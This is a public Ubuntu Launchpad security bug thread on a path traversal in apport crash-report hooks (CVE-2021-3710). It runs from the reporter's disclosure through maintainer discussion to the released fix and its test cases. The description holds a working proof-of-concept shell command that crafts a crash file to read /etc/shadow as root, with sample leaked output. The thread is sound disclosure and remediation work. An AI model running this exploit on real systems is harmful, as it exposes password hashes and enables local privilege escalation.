@@ -1,0 +1,503 @@
+Bug #1933832: Path traversal leads to arbitrary file read
+
+URL: https://bugs.launchpad.net/ubuntu/+source/xorg/+bug/1933832
+
+Metadata: security_related=true; information_type=Public Security; tags=["patch"]; targets=Apport (Fix Released, Critical), apport (Ubuntu) (Fix Released, Undecided), openjdk-13 (Ubuntu) (Won't Fix, Undecided), openjdk-14 (Ubuntu) (Won't Fix, Undecided), openjdk-15 (Ubuntu) (Won't Fix, Undecided), openjdk-16 (Ubuntu) (Won't Fix, Undecided), openjdk-17 (Ubuntu) (Won't Fix, Undecided), openjdk-18 (Ubuntu) (Won't Fix, Undecided), openjdk-8 (Ubuntu) (Won't Fix, Undecided), xorg (Ubuntu) (Won't Fix, Undecided)
+
+Description:
+While reiterating the issues reported in https://bugs.launchpad.net/bugs/1917904, Stephen Röttger (@_tsuro) mentioned, that the second issue "Arbitrary file read in package-hooks/source_xorg.py (Info)" might additionally contain a path traversal vulnerability. This was confirmed by developing a PoC, that enables a user to read arbitrary files in the context of the root user, leading to elevation of privileges. Exploiting this issue requires, that automatic crash reporting is enabled.
+
+The following excerpt of the file `package-hooks/source_xorg.py` shows the vulnerable code:
+
+if True or report.get('SourcePackage','Unknown') == "compiz" and "ProcStatus" in report:
+    compiz_pid = 0
+    pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])       # [0]
+    if pid_line:
+        compiz_pid = pid_line.groups()[0]
+    compiz_state_file = '/tmp/compiz_internal_state%s' % compiz_pid  # [1]
+    attach_file_if_exists(report, compiz_state_file, "compiz_internal_states")
+
+While in [0] the `pid_line` is extracted, this value (if successfully matched) is appended to the file path resulting in `compiz_state_file` [1], which is subsequently attached to the crash file.
+Using a `Pid` such as `JRN/../../../../etc/shadow` therefore results in the file `/etc/shadow` being attached (after creating the directory `/tmp/compiz_internal_stateJRN`).
+
+The following POC (tested on 20.04/21.04 Desktop) exploits this issue to read the file `/etc/shadow`:
+
+mkdir /tmp/compiz_internal_stateJRN/;pid=$'\tJRN/../../../etc/shadow';cat << EOF > /var/crash/poc.crash
+ExecutablePath: /poc
+Package: source_xorg 123
+ProcStatus:
+ Pid:$pid
+ Uid:$pid
+EOF
+
+When reading the crash file (after `whoopsie-upload-all` ran), the contents of the file `/etc/shadow` are indeed attached:
+grep -A3 compiz_internal /var/crash/poc.crash
+compiz_internal_states:
+ root:!:18393:0:99999:7:::
+ daemon:*:18375:0:99999:7:::
+ bin:*:18375:0:99999:7:::
+
+Please credit Stephen Röttger (@_tsuro) in a potential CVE/USN.
+
+Best regards,
+Maik
+
+Discussion:
+Message 2 | Author: alexmurray | Subject: Re: Path traversal leads to arbitrary file read
+Thanks for reporting this issue - this file comes from the xserver-xorg source package so I am adding that as an affected package - I also see there is a similar pattern in apport/ui.py itself, plus the openjdk source packages all have similar logic there too and would likely be affected as well.
+
+In this case it could easily be handled by changing these scripts to be more strict when parsing out the Pid, as follows::
+
+pid_line = re.search("Pid:\t([0-9]+)\n", report["ProcStatus"])
+
+I'll look at constructing patches based on this approach.
+
+---
+Message 3 | Author: alexmurray | Subject: Re: Path traversal leads to arbitrary file read
+For future reference, the other source packages were identified via debian codesearch and looking at unpacked sources for apport and openjdk etc:
+
+codesearch-cli '\bPid:\\t\(\.\*\)'
+path: openjdk-11_11.0.12+4-1/debian/apport-hook.py
+        # attach hs_err_<pid>.pid file
+        cwd = report['ProcCwd']
+        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+        if pid_line:
+            pid = pid_line.groups()[0]
+path: openjdk-17_17~27-1/debian/apport-hook.py
+        # attach hs_err_<pid>.pid file
+        cwd = report['ProcCwd']
+        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+        if pid_line:
+            pid = pid_line.groups()[0]
+path: openjdk-15_15.0.3+3-1/debian/apport-hook.py
+        # attach hs_err_<pid>.pid file
+        cwd = report['ProcCwd']
+        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+        if pid_line:
+            pid = pid_line.groups()[0]
+path: openjdk-16_16.0.1+9-1/debian/apport-hook.py
+path: openjdk-8_8u292-b10-3/debian/apport-hook.py
+--
+Files grepped: 8
+
+$ rg 'Pid:\\t\(\.\*\)' *
+xorg/bionic/xorg-7.7+19ubuntu7.1/debian/source_xorg.py
+432:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+xorg/impish/xorg-7.7+22ubuntu1/debian/source_xorg.py
+432:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+xorg/focal/xorg-7.7+19ubuntu14/debian/source_xorg.py
+432:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+xorg/hirsute/xorg-7.7+22ubuntu1/debian/source_xorg.py
+
+xorg/groovy/xorg-7.7+19ubuntu15/debian/source_xorg.py
+
+openjdk-8/bionic/openjdk-8-8u292-b10/debian/apport-hook.py
+24:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+openjdk-8/groovy/openjdk-8-8u292-b10/debian/apport-hook.py
+24:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+openjdk-8/focal/openjdk-8-8u292-b10/debian/apport-hook.py
+24:        pid_line = re.search("Pid:\t(.*)\n", report["ProcStatus"])
+
+openjdk-8/impish/openjdk-8-8u292-b10/debian/apport-hook.py
+
+openjdk-8/xenial/openjdk-8-8u292-b10/debian/apport-hook.py
+
+openjdk-8/hirsute/openjdk-8-8u292-b10/debian/apport-hook.py
+
+openjdk-18/impish/openjdk-18-18~2/debian/apport-hook.py
+
+openjdk-15/hirsute/openjdk-15-15.0.3+3/debian/apport-hook.py
+
+openjdk-15/groovy/openjdk-15-15.0.3+3/debian/apport-hook.py
+
+openjdk-14/groovy/openjdk-14-14.0.2+12/debian/apport-hook.py
+
+openjdk-16/impish/openjdk-16-16.0.1+9/debian/apport-hook.py
+
+openjdk-14/focal/openjdk-14-14.0.2+12/debian/apport-hook.py
+
+openjdk-15/impish/openjdk-15-15.0.3+3/debian/apport-hook.py
+
+openjdk-16/groovy/openjdk-16-16.0.1+9/debian/apport-hook.py
+
+openjdk-13/groovy/openjdk-13-13.0.7+5/debian/apport-hook.py
+
+openjdk-17/impish/openjdk-17-17~24/debian/apport-hook.py
+
+openjdk-16/focal/openjdk-16-16.0.1+9/debian/apport-hook.py
+
+openjdk-17/hirsute/openjdk-17-17~19/debian/apport-hook.py
+
+openjdk-13/focal/openjdk-13-13.0.7+5/debian/apport-hook.py
+
+openjdk-16/hirsute/openjdk-16-16.0.1+9/debian/apport-hook.py
+
+apport/bionic/apport-2.20.9/apport/ui.py
+54:        pid = re.search('Pid:\t(.*)\n', report.get('ProcStatus', '')).group(1)
+
+apport/groovy/apport-2.20.11/apport/ui.py
+54:        pid = re.search('Pid:\t(.*)\n', report.get('ProcStatus', '')).group(1)
+
+apport/focal/apport-2.20.11/apport/ui.py
+54:        pid = re.search('Pid:\t(.*)\n', report.get('ProcStatus', '')).group(1)
+
+apport/hirsute/apport-2.20.11/apport/ui.py
+
+apport/impish/apport-2.20.11/apport/ui.py
+
+apport/trusty/apport-2.14.1/apport/ui.py
+53:        pid = re.search('Pid:\t(.*)\n', report.get('ProcStatus', '')).group(1)
+
+apport/xenial/apport-2.20.1/apport/ui.py
+53:        pid = re.search('Pid:\t(.*)\n', report.get('ProcStatus', '')).group(1)
+
+---
+Message 4 | Author: alexmurray | Subject: Re: Path traversal leads to arbitrary file read
+I also went looking for instances of attach_file() which may be vulnerable to this type of attack (ie using a computed filename that may be able to be influenced by untrusted content from the report) by searching for calls to this across the entire debian archive which use a variable name for the file-name argument:
+
+$ codesearch-cli "attach_file(_if_exists)?\(report($|,$|, [a-z])"
+path: grub2_2.04-19/debian/apport/source_grub2.py
+                       and not check_shell_syntax(fullpath):
+                        invalid_grub_script.append(fullpath)
+     91                 attach_file(report, fullpath)
+path: gnome-shell_3.38.4-1/debian/source_gnome-shell.py
+                monitors = os.path.expanduser('~/.config/monitors.xml')
+     28     attach_file_if_exists(report, monitors, 'monitors.xml')
+path: dkms_2.8.4-4/dkms_apport.py
+        report['PackageVersion'] = version
+        report['Title'] = "%s %s: %s kernel module failed to build" % (package, version, options.module)
+     84 attach_file_if_exists(report, make_log, 'DKMSBuildLog')
+path: dkms_2.8.4-4/dkms_apport.py
+        if report['SourcePackage'] == 'fglrx-installer':
+            fglrx_make_log = os.path.join('/var','lib','dkms',options.module,options.version,'build','make.sh.log')
+     80     attach_file_if_exists(report, fglrx_make_log, 'FglrxBuildLog')
+path: shim-signed_1.37/debian/source_shim-signed.py
+            attach_file(report, '/proc/sys/kernel/moksbstate_disabled')
+            attach_file(report, sb_var)
+     55     attach_file(report, mok_var)
+path: shim-signed_1.37/debian/source_shim-signed.py
+            attach_file(report, '/proc/sys/kernel/moksbstate_disabled')
+     54     attach_file(report, sb_var)
+path: plank_0.11.89-3/data/apport/source_plank.py
+        def add_info(report, ui=None):
+     27 	attach_file_if_exists(report, path.expanduser('~/.config/plank/dock1/settings'), 'DockSettings')
+path: gnome-shell-xrdesktop_3.36.1-2/debian/source_gnome-shell.py
+                monitors = os.path.expanduser('~/.config/monitors.xml')
+     28     attach_file_if_exists(report, monitors, 'monitors.xml')
+path: conky_1.11.6-2/debian/conky.py
+                conkyrc_path = path.expanduser('~/.conkyrc')
+                if path.exists(conkyrc_path):
+     17             attach_file(report, conkyrc_path)
+path: conky_1.11.6-2/debian/conky.py
+                                           open(conkyrc_path).read(),
+                                           re.MULTILINE):
+     21                 attach_file_if_exists(report, file)
+path: vsftpd_3.0.3-13/debian/vsftpd.apport
+                attach_conffiles(report,'vsftpd')
+     30     attach_file_if_exists(report, os.path.expanduser('/var/log/vsftpd.log'), 'vsftpd.log')
+path: rednotebook_2.21+ds-1/debian/source_rednotebook.py
+            for (key, name) in LOGS:
+                log = path.join(rednotebook_dir, name)
+     22         attach_file_if_exists(report, log, key)
+path: shotwell_0.30.11-1/apport/shotwell.py
+        def add_info(report):
+            log_file = os.path.expanduser('~/.cache/shotwell/shotwell.log')
+      6     apport.hookutils.attach_file_if_exists(report, log_file, 'shotwell.log')
+
+Of these, the conky script also appears to allow untrusted files to be attached: https://sources.debian.org/src/conky/1.11.6-2/debian/conky.py/#L21 but this is a separate issue so I will file a new bug report for that.
+
+---
+Message 5 | Author: alexmurray | Subject: Re: Path traversal leads to arbitrary file read
+The conky apport script is not able to be expoited - whilst we can create a ~/.conkyrc specifying to load /etc/shadow say and then create a crash report to try and trigger this to occur:
+
+echo "lua_load /etc/shadow" >> ~/.conkyrc
+
+cat << EOF > /var/crash/poc.crash
+ExecutablePath: /poc
+Package: conky 123
+ProcStatus:
+ Pid:1000
+ Uid:1000
+EOF
+
+When say whoopsie-upload-all runs, it either runs as a standard user - who does not have permission to read /etc/shadow - or it could run as root if say triggered by the system administrator - however in this case, since the script has:
+
+conkyrc_path = path.expanduser('~/.conkyrc')
+
+it will try and load /root/.conkyrc not one from the unprivileged user - hence there doesn't appear to be any way to use this to escalate privileges.
+
+---
+Message 6 | Author: mallle | Subject: Re: Path traversal leads to arbitrary file read
+I kindly wanted to asked if there are any updates on this issue?
+
+---
+Message 7 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+The problem here is that while apport runs as the user and attach_file is being run with appropriate privileges, whoopsie is being run as root. When most of the hooks were written, it was assumed that they would be run unprivileged.
+
+I think we should handle this in apport itself by modifying attach_file to perform the following checks:
+
+1- If running as root, check if the file is world-readable, if not, don't attach it
+2- Don't follow symlinks
+3- Strip directory traversal strings like /./ and /../
+
+This would allow us to fix the issue in apport itself and not have to fix every instance of attach_file in every package.
+
+Thoughts?
+
+---
+Message 8 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+Actually, /./ doesn't matter....and we should simply reject paths that contain /../ rather than try and strip them.
+
+---
+Message 9 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+If we do check if the file is world-readable, we'll have to do it for all directories in the path too...
+
+---
+Message 10 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+OK, on second thought, I don't think doing #1 makes sense as we will be missing a bunch of log files from user directories that may be useful. Apport hooks need to be aware that they may either be running as the user when being processed by the Apport GUI, or they may be running as root when being processed by whoopsie.
+
+I do think we should implement #2 and #3 though.
+
+---
+Message 11 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+Apport hookutils' read_file() already implements #2, so we only need to prevent directory traversal.
+
+---
+Message 12 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+read_file() only checks the basename for symlinks, so, in the case of openjdk and xorg, the apport hook can still be exploited even without directory traversal:
+
+openjdk:
+
+            path = "%s/hs_err_pid%s.log" % (cwd, pid)
+            # make sure if exists
+            if os.path.exists(path):
+                content = read_file(path)
+
+cwd could be /home/attacker, /home/attacker/hs_err_pid could be a symlink to some other system directory, and pid can be an arbitrary filename. This would allow a root-owned file ending in .log to be read.
+
+Code in xorg is similar, but being hardcoded to '/tmp/compiz_internal_state%s' means it will likely be prevented if kernel symlink restrictions are enabled.
+
+---
+Message 13 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+Here is a possible debdiff for review. I've asked for a CVE to be assigned to this bug and the other one.
+
+---
+Message 14 | Author: alexmurray | Subject: Re: Path traversal leads to arbitrary file read
+Thanks for picking this up Marc - yep I think this is a great idea - short of re-architecting the whole of apport/whoopsie :)
+
+---
+Message 15 | Author: sbeattie | Subject: Re: Path traversal leads to arbitrary file read
+Please use CVE-2021-3710 for this issue. Thanks!
+
+---
+Message 16 | Author: seth-arnold | Subject: Re: Path traversal leads to arbitrary file read
+I think this will leak the fd in the event the error is hit:
+
+         fd = os.open(path, os.O_NOFOLLOW | os.O_RDONLY | os.O_NONBLOCK)
+         st = os.fstat(fd)
++        # make sure there are no symlinks in the full path
++        real_path = os.path.realpath(path)
++        if st.st_ino != os.stat(real_path).st_ino or path != real_path:
++            return 'Error: path contained symlinks.'
+
+Thanks
+
+---
+Message 17 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+Ah! Yes, thanks for that, I'll fix it up.
+
+Seth, do you think the approach I used to resolve symlinks by looking up the inode is a sane one?
+
+---
+Message 18 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+FYI, I've discovered a small regression with the proposed debdiff, I'm still working on it.
+
+---
+Message 19 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+I propose we publish these updates on 2021-09-14.
+
+That will allow us to perform the final testing of these updates this week.
+
+Please advise if that public date is problematic.
+
+Thanks!
+
+---
+Message 20 | Author: janitor | Subject: Re: Path traversal leads to arbitrary file read
+This bug was fixed in the package apport - 2.20.11-0ubuntu65.3
+
+---------------
+apport (2.20.11-0ubuntu65.3) hirsute-security; urgency=medium
+
+  * SECURITY UPDATE: Arbitrary file read (LP: #1934308)
+    - data/general-hooks/ubuntu.py: don't attempt to include emacs
+      byte-compilation logs, they haven't been generated by the emacs
+      packages in a long time.
+    - CVE-2021-3709
+  * SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
+    - apport/hookutils.py, test/test_hookutils.py: detect path traversal
+      attacks, and directory symlinks.
+    - CVE-2021-3710
+
+ -- Marc Deslauriers <email address hidden>  Thu, 26 Aug 2021 10:55:40 -0400
+
+---
+Message 21 | Author: janitor | Subject: Re: Path traversal leads to arbitrary file read
+This bug was fixed in the package apport - 2.20.11-0ubuntu27.20
+
+---------------
+apport (2.20.11-0ubuntu27.20) focal-security; urgency=medium
+
+  * SECURITY UPDATE: Arbitrary file read (LP: #1934308)
+    - data/general-hooks/ubuntu.py: don't attempt to include emacs
+      byte-compilation logs, they haven't been generated by the emacs
+      packages in a long time.
+    - CVE-2021-3709
+  * SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
+    - apport/hookutils.py, test/test_hookutils.py: detect path traversal
+      attacks, and directory symlinks.
+    - CVE-2021-3710
+
+ -- Marc Deslauriers <email address hidden>  Thu, 26 Aug 2021 10:30:01 -0400
+
+---
+Message 22 | Author: janitor | Subject: Re: Path traversal leads to arbitrary file read
+This bug was fixed in the package apport - 2.20.9-0ubuntu7.26
+
+---------------
+apport (2.20.9-0ubuntu7.26) bionic-security; urgency=medium
+
+  * SECURITY UPDATE: Arbitrary file read (LP: #1934308)
+    - data/general-hooks/ubuntu.py: don't attempt to include emacs
+      byte-compilation logs, they haven't been generated by the emacs
+      packages in a long time.
+    - CVE-2021-3709
+  * SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
+    - apport/hookutils.py, test/test_hookutils.py: detect path traversal
+      attacks, and directory symlinks.
+    - CVE-2021-3710
+
+ -- Marc Deslauriers <email address hidden>  Thu, 26 Aug 2021 10:56:33 -0400
+
+---
+Message 23 | Author: mdeslaur | Subject: Re: Path traversal leads to arbitrary file read
+Updates have now been released:
+
+https://ubuntu.com/security/notices/USN-5077-1
+
+Thanks!
+
+Relevant attachments:
+apport_2.20.11-0ubuntu65.2.debdiff:
+diff -Nru apport-2.20.11/apport/hookutils.py apport-2.20.11/apport/hookutils.py
+--- apport-2.20.11/apport/hookutils.py	2021-05-18 09:14:38.000000000 -0400
++++ apport-2.20.11/apport/hookutils.py	2021-08-13 09:52:21.000000000 -0400
+@@ -62,6 +62,11 @@
+     If the contents is valid UTF-8, or force_unicode is True, then the value
+     will be a string, otherwise it will be bytes.
+     '''
++    # Prevent directory traversal. Do it here too so it won't disclose if
++    # a file exists or not.
++    if "../" in path:
++        return
++
+     if not key:
+         key = path_to_key(path)
+
+@@ -79,9 +84,16 @@
+     instead of failing.
+     '''
+     try:
+-        # make sure the file isn't a FIFO or symlink
++        # Prevent directory traversal
++        if "../" in path:
++            return 'Error: invalid path.'
+         fd = os.open(path, os.O_NOFOLLOW | os.O_RDONLY | os.O_NONBLOCK)
+         st = os.fstat(fd)
++        # make sure there are no symlinks in the full path
++        real_path = os.path.realpath(path)
++        if st.st_ino != os.stat(real_path).st_ino or path != real_path:
++            return 'Error: path contained symlinks.'
++        # make sure the file isn't a FIFO or symlink
+         if stat.S_ISREG(st.st_mode):
+             with os.fdopen(fd, 'rb') as f:
+                 contents = f.read().strip()
+diff -Nru apport-2.20.11/data/general-hooks/ubuntu.py apport-2.20.11/data/general-hooks/ubuntu.py
+--- apport-2.20.11/data/general-hooks/ubuntu.py	2021-04-07 12:42:10.000000000 -0400
++++ apport-2.20.11/data/general-hooks/ubuntu.py	2021-08-13 09:52:06.000000000 -0400
+@@ -260,18 +260,6 @@
+                 # File these reports on the initramfs-tools package instead
+                 report['SourcePackage'] = 'initramfs-tools'
+
+-        if report['Package'] in ['emacs22', 'emacs23', 'emacs-snapshot', 'xemacs21']:
+-            # emacs add-on packages trigger byte compilation, which might fail
+-            # we are very interested in reading the compilation log to determine
+-            # where to reassign this report to
+-            regex = r'^!! Byte-compilation for x?emacs\S+ failed!'
+-            if attachment in report and re.search(regex, log_file, re.MULTILINE):
+-                for line in log_file.split('\n'):
+-                    m = re.search(r'^!! and attach the file (\S+)', line)
+-                    if m:
+-                        path = m.group(1)
+-                        apport.hookutils.attach_file_if_exists(report, path)
+-
+         if report['Package'].startswith('linux-image-') and attachment in report:
+             # /etc/kernel/*.d failures from kernel package postinst
+             m = re.search(r'^run-parts: (/etc/kernel/\S+\.d/\S+) exited with return code \d+', log_file, re.MULTILINE)
+diff -Nru apport-2.20.11/debian/changelog apport-2.20.11/debian/changelog
+--- apport-2.20.11/debian/changelog	2021-05-18 09:15:10.000000000 -0400
++++ apport-2.20.11/debian/changelog	2021-08-13 09:52:21.000000000 -0400
+@@ -1,3 +1,17 @@
++apport (2.20.11-0ubuntu65.2) hirsute-security; urgency=medium
++
++  * SECURITY UPDATE: Arbitrary file read (LP: #1934308)
++    - data/general-hooks/ubuntu.py: don't attempt to include emacs
++      byte-compilation logs, they haven't been generated by the emacs
++      packages in a long time.
++    - CVE-20xx-xxxx
++  * SECURITY UPDATE: Info disclosure via path traversal (LP: #1933832)
++    - apport/hookutils.py, test/test_hookutils.py: detect path traversal
++      attacks, and directory symlinks.
++    - CVE-20xx-xxxx
++
++ -- Marc Deslauriers <marc.deslauriers@ubuntu.com>  Fri, 13 Aug 2021 09:52:21 -0400
+ apport (2.20.11-0ubuntu65.1) hirsute-security; urgency=medium
+
+   * SECURITY UPDATE: Multiple arbitrary file reads (LP: #1917904)
+diff -Nru apport-2.20.11/test/test_hookutils.py apport-2.20.11/test/test_hookutils.py
+--- apport-2.20.11/test/test_hookutils.py	2021-05-12 11:50:45.000000000 -0400
++++ apport-2.20.11/test/test_hookutils.py	2021-08-13 09:52:21.000000000 -0400
+@@ -101,6 +101,20 @@
+         self.assertEqual(list(report), ['Symlink'])
+         self.assertTrue(report['Symlink'].startswith('Error: '))
+
++        # directory symlink
++        link = os.path.join(self.workdir, 'dirsymlink')
++        os.symlink('/etc', link)
++        report = {}
++        apport.hookutils.attach_file(report, os.path.join(link, 'passwd'), 'DirSymlink')
++        self.assertEqual(list(report), ['DirSymlink'])
++        self.assertTrue(report['DirSymlink'].startswith('Error: '))
++        # directory traversal
++        report = {}
++        apport.hookutils.attach_file(report, '/etc/../etc/passwd', 'Traversal')
++        self.assertEqual(list(report), ['Traversal'])
++        self.assertTrue(report['Traversal'].startswith('Error: '))
+         # existing key
+         report = {}
+         apport.hookutils.attach_file(report, '/etc/passwd')
+@@ -158,6 +172,11 @@
+         apport.hookutils.attach_file_if_exists(report, '/nonexisting')
+         self.assertEqual(list(report), [])
+
++        # directory traversal
++        report = {}
++        apport.hookutils.attach_file_if_exists(report, '/etc/../etc/passwd')
++        self.assertEqual(list(report), [])
+     def test_path_to_key(self):
+         '''transforming a file path to a valid report key'''
